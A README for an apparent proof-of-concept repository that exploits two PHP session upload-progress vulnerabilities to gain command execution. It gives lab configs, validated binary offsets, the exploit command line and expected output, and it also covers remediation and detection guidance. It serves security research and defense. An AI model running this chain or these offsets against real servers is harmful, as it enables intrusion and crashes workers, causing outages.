# PHP2Shell PoC — CVE-2026-109618 / CVE-2026-109619

**Classification:** Internal security research — authorized testing only
**Status:** Lab-validated PoC; not a universal remote exploit
**Last validated:** 2026-10-22

## Overview

This repository contains a proof-of-concept exploit for the PHP2Shell
vulnerability family in PHP's `session.upload_progress` handling:

- **CVE-2026-109618** — out-of-memory corruption caused by `longjmp()` after
  an OOM, leaving `PS(http_session_vars)` dangling.
- **CVE-2026-109619** — stale global state that survives across requests and
  can expose worker memory or enable code execution.

The included chain performs a heap leak, a `libphp` base leak, and a forged
`pDestructor` call to reach `zif_system`, resulting in command execution as
the PHP worker. It is intended for controlled lab environments and authorized
security assessments only.

> **This is not a vulnerability scanner.** It sends OOM payloads, crashes
> PHP workers, and depends on target-specific binary offsets. Do not run it
> against production systems without explicit written authorization and a
> tested rollback plan.

## What is included

| File | Purpose |
|------|---------|
| `php2shell.py` | Standalone exploit and passive check mode |
| `README.md` | This document |

Generated files such as `out/`, `*.log`, and proof files are deliberately
excluded from the repository. Do not commit target data, session cookies,
captured responses, or production hostnames.

## Affected versions

Per the upstream advisory, PHP versions with `session.upload_progress` support
(PHP 5.4.0 and later) may be affected. Current supported branches:

| Branch | Vulnerable | First fixed release |
|--------|------------|---------------------|
| 8.5 | `<= 8.5.11` | `8.5.12` |
| 8.4 | `<= 8.4.26` | `8.4.27` |
| 8.3 | `<= 8.3.35` | `8.3.36` |
| 8.2 | `<= 8.2.34` | `8.2.35` |
| 8.1 and older | EOL | No upstream patch; upgrade or isolate |

Version alone is not proof of exploitability. The actual exposure depends on
the SAPI, process model, session configuration, and the exact PHP build.

## Requirements

- Python 3.9+ (standard library only)
- Linux x86-64 target using **Apache prefork + mod_php**
- Native PHP sessions active, with:
  - `session.upload_progress.enabled = On`
  - `session.use_cookies = 1`
  - `session.use_strict_mode = 0`
  - `display_errors = 1` for this PoC's leak path
  - `memory_limit` lower than the OOM payload size
- Single-worker prefork for reliable worker rotation
- Exact `libphp` offsets for the target build

The exploit is **not** expected to work against PHP-FPM, nginx/FastCGI,
LiteSpeed/LSAPI, Windows PHP, or arbitrary distributions without adaptation.

## Passive check

This mode performs a GET request and fingerprints the PHP version. It does not
send the exploit payload.

```bash
python3 php2shell.py check -u https://example.com/
```

Bulk mode:

```bash
python3 php2shell.py check -f targets.txt -o results.jsonl --workers 8
```

A `likely_vulnerable` result only means the reported version is below the
fixed threshold. It is not confirmation of RCE.

## Lab reproduction

Use the exact Bookworm image. The unqualified `php:8.4.26-apache` tag may now
resolve to a newer Debian base, which changes the binary and heap layout.

This minimal repository does not ship the Docker harness, but you can create
one with the following configs. The target page is deliberately trivial; no
application code is required.

```bash
mkdir -p lab/www out
chmod 1777 out

cat > lab/php.ini <<'EOF'
display_errors = On
display_startup_errors = On
error_reporting = E_ALL

memory_limit = 8M
post_max_size = 64M
upload_max_filesize = 64M

session.save_path = "/tmp"
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
EOF

cat > lab/apache.conf <<'EOF'
KeepAlive Off

<IfModule mpm_prefork_module>
    StartServers           1
    MinSpareServers        1
    MaxSpareServers        1
    MaxRequestWorkers      1
    ServerLimit            1
    MaxConnectionsPerChild 0
</IfModule>
EOF

printf '%s\n' '<?php echo "OK\n"; ?>' > lab/www/index.php

docker run -d --name php2shell-target \
  --platform linux/amd64 \
  -p 127.0.0.1:8088:80 \
  -v "$PWD/lab/php.ini:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro" \
  -v "$PWD/lab/apache.conf:/etc/apache2/conf-enabled/zz-php2shell.conf:ro" \
  -v "$PWD/lab/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache-bookworm \
  /bin/sh -c 'chmod 1777 /out; exec apache2-foreground'

curl -sSI http://127.0.0.1:8088/index.php | grep -E 'Server|X-Powered-By'
```

For this exact image, the validated offsets are:

```text
ZIF_OFFSET=0x45a3b0
DTOR_OFFSET=0x64eb60
HTDATA_OFFSET=0x690d8
```

Run with a short command and a proof file:

```bash
python3 php2shell.py exploit \
  -u http://127.0.0.1:8088/index.php \
  -c 'id>/out/p1' \
  --proof-file out/p1 \
  --profile bookworm \
  --zif-offset 0x45a3b0 \
  --dtor-offset 0x64eb60 \
  --htdata-offset 0x690d8

cat out/p1
```

Expected proof:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Offsets and build compatibility

The exploit needs three target-specific values:

- `zif_system` offset in `libphp.so`
- `ZVAL_PTR_DTOR` / `zval_ptr_dtor` offset in `libphp.so`
- `htdata_offset`, the chunk-relative location of the live 167-byte carrier

ASLR bypass leaks the randomized base addresses. It does **not** discover the
relative symbol offsets or the heap layout. Those must come from the matching
binary or from a calibrated lab run.

Options:

1. **Known image/profile** — use the validated offsets for
   `php:8.4.26-apache-bookworm`.
2. **Local container** — if the upstream `docker/offsets.py` helper is present,
   it can read symbols from the running container and cache them in
   `out/offsets.env`.
3. **Remote target** — obtain the exact PHP package/build, extract the matching
   `libphp.so`, and derive the offsets offline. Then pass them explicitly.

Do not brute-force offsets against a production target. Failed attempts crash
workers and can cause a denial of service.

## Validation notes

| Build | Result |
|-------|--------|
| `php:8.4.26-apache-bookworm` | RCE confirmed: `uid=33(www-data)` |
| `php:8.4.27-apache-bookworm` | Heap leak fails; patched behavior confirmed |
| `php:8.5.4-apache-bookworm` | Heap/libphp leaks work; stage 3 layout not calibrated |

The 8.5.4 result is not an RCE proof. Do not report a target as exploitable
based only on version or on partial leak stages.

## Safety and limitations

- The PoC can terminate PHP workers and disrupt availability.
- It requires a writable proof channel (`/out` bind mount, webroot, or an
  equivalent controlled path).
- It is a **combined CVE-2026-109618 / CVE-2026-109619 chain**; it is not a
  clean standalone test of either CVE in isolation.
- It is not universal. A different PHP build, SAPI, or process model requires
  new offsets or a different exploitation primitive.
- Do not upload target-specific responses, cookies, credentials, or customer
  data to this repository.

## Remediation

The only complete fix is to upgrade PHP and restart all workers:

```bash
# Debian/Ubuntu example
apt update && apt upgrade 'php*'
systemctl restart apache2   # or php-fpm
```

If immediate upgrade is not possible, reduce exposure by disabling upload
progress where the application does not require it:

```ini
session.upload_progress.enabled = Off
```

Also consider:

- reducing `post_max_size`
- setting `display_errors = 0` in production
- disabling fatal-error backtraces where supported
- restricting worker lifetime
- applying vendor/WAF mitigations as temporary controls

Configuration changes are not a substitute for patching.

## Detection

Investigate:

- PHP worker crashes/restarts (`SIGABRT`, `SIGSEGV`) during normal traffic
- unusual multipart POSTs containing `PHP_SESSION_UPLOAD_PROGRESS`
- oversized `Set-Cookie: PHPSESSID` values or malformed session cookies
- repeated memory-limit errors followed by worker rotation
- unexpected child processes spawned by the web worker

Absence of these signals does not prove a host is unaffected.

## Attribution

This PoC is derived from the public PHP2Shell research and the
`godylockz/cve-2026-109618-php2shell` PoC. Retain upstream attribution and
review the upstream license before redistribution. The widened x86-64 pointer
range in this copy supports lab layouts where leaked pointers begin with
`0x7d` rather than `0x7f`.

## References

- PHP security release: <https://www.php.net/archive/2026.php>
- CVE-2026-109618: <https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w>
- CVE-2026-109619: <https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp>
- PHP2Shell research: <https://php2shell.com/>
- Wiz research: <https://www.wiz.io/blog/php2shell-php-rce>
- Calif research: <https://calif.io/php2shell/>

## Legal

Use only against systems you own or have explicit written permission to test.
You are responsible for complying with your organization's rules of engagement,
disclosure policy, and applicable law.
